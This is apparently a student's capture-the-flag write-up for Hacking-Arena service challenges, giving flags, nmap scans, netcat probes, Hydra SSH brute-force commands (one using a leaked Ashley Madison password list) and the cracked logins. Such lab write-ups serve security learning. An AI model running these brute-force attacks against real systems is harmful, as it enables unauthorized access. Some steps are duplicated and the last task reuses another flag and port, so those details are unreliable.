# Services

## Tools

* Filezilla => ftp connect
* Hydra, madusa => (brutfocing)
* netcat => connect to service
* nmap => Scan port and services


## Websites

* cirt.net
* Exploit database

# The tasks

## Service 2

----------------------------------------------------------

**The Flag**: Hacking-Arena{D0nt_l4t_m4_c0nn4ct_n4xt_t1m4}

**The Task**: Find the service on kenobi.hackingarena.com in the port range: 7500-8000 Look for the flag

**Solution**:

1. I scanned the ports with nmap 

        sudo nmap -sS kenobi.hackingarena.com -p 7500-8000

2. And then i connected to the service with netcat to show what service is it.

        nc kenobi.hackingarena.com 7776

3. Then i used *filezilla* app to download the flag file with anonymous .

**Pictures**:

[![Image from Gyazo](https://i.gyazo.com/fabf247c0913384e055d4b2adc8ea078.png)](https://gyazo.com/fabf247c0913384e055d4b2adc8ea078)

[![Image from Gyazo](https://i.gyazo.com/38a7fbd67e6f910a5c86b4cad135e587.png)](https://gyazo.com/38a7fbd67e6f910a5c86b4cad135e587)

[![Image from Gyazo](https://i.gyazo.com/1e452107fd9bd5ed95bb981862cb3fce.png)](https://gyazo.com/1e452107fd9bd5ed95bb981862cb3fce)

[![Image from Gyazo](https://i.gyazo.com/77ab287a0993c6749fccc2b4bd590b37.png)](https://gyazo.com/77ab287a0993c6749fccc2b4bd590b37)




<br>


## Service 1

----------------------------------------------------------

**The Flag**: Hacking-Arena{B4_careful_w1th_passw0rds}

**The Task**: What is this service on kenobi.hackingarena.com in the range 8000-8500? My username is laszlo, I like typical passwords :)

**Solution**:

1. I scanned the ports with nmap 

        sudo nmap -sS kenobi.hackingarena.com -p 8000-8500

2. And then i connected to the service with netcat to show what service is it (ssh).

        nc kenobi.hackingarena.com 8085

3. Then i used hydra to brutforce the ssh server.

        hydra -l laszlo -P /usr/share/john/password.lst kenobi.hackingarena.com ssh -s 8085

4. lastly i connected to ssh to get the flag with username laszlo and password dragon that we found with hydra.

        ssh laszlo@158.39.48.133 -p 8085 

**Pictures**:

[![Image from Gyazo](https://i.gyazo.com/b6845fd0ab956f88679a9c13eb10941e.png)](https://gyazo.com/b6845fd0ab956f88679a9c13eb10941e)

[![Image from Gyazo](https://i.gyazo.com/cfd2f92b9bc6aec30e1297e23c76c360.png)](https://gyazo.com/cfd2f92b9bc6aec30e1297e23c76c360)

[![Image from Gyazo](https://i.gyazo.com/938be5a646e3ae1f4a73818a4c368228.png)](https://gyazo.com/938be5a646e3ae1f4a73818a4c368228)

[![Image from Gyazo](https://i.gyazo.com/467b5b886a84a0a69ff956bbe948bfca.png)](https://gyazo.com/467b5b886a84a0a69ff956bbe948bfca)



## Casanova

----------------------------------------------------------

**The Flag**: Hacking-Arena{Th1s_1s_n0t_Casan0va}

**The Task**: Hi guys, I need your help. I've got an email to pay 0.5 bitcoin. If not, they release all my private files stored on my secure server here: http://kenobi.hackingarena.com:9393 My username is casanova. Ok, ok, I'm using the same password everywhere for like 5 years now and probably the password is not so strong. But I've never had any incident before (except for this embarrassing Ashley Madison case, but fortunately nobody could identify me). Could you please help me out?



**Solution**:

1. And then i connected to the service with netcat to show what service is it (ssh).

        nc kenobi.hackingarena.com 9393

2. And then i connected to the service with netcat to show what service is it (ssh).

        nc kenobi.hackingarena.com 8085

3. Then i downloaded Ashley password list.

4. Then i used hydra to brutforce the ssh server with ashley list.

        hydra -l casanova -P Ashley-Madison.txt kenobi.hackingarena.com ssh -s 9393

4. lastly i connected to ssh to get the flag with username casanova and password kazuga that we found with hydra.

        ssh casanova@158.39.48.133 -p 9393 

**Pictures**:

[![Image from Gyazo](https://i.gyazo.com/08e7774b5977570cfab1365c79fb3047.png)](https://gyazo.com/08e7774b5977570cfab1365c79fb3047)

[![Image from Gyazo](https://i.gyazo.com/b40cf7a6f8b2782a3d68f914b0a7ddff.png)](https://gyazo.com/b40cf7a6f8b2782a3d68f914b0a7ddff)



## Aloha

----------------------------------------------------------

**The Flag**: Hacking-Arena{Th1s_1s_n0t_Casan0va}

**The Task**: Aloha! There's a service on kenobi.hackingarena.com in the port range 8500-9000. I hope you cannot log in :)


**Solution**:

1. I scanned the ports with nmap 

        sudo nmap -sS kenobi.hackingarena.com -p 8500-9000

2. then i googled hawaii emergency password.
3. then i logged in with password Warningpoint2.

        nc kenobi.hackingarena.com 9393


**Pictures**:

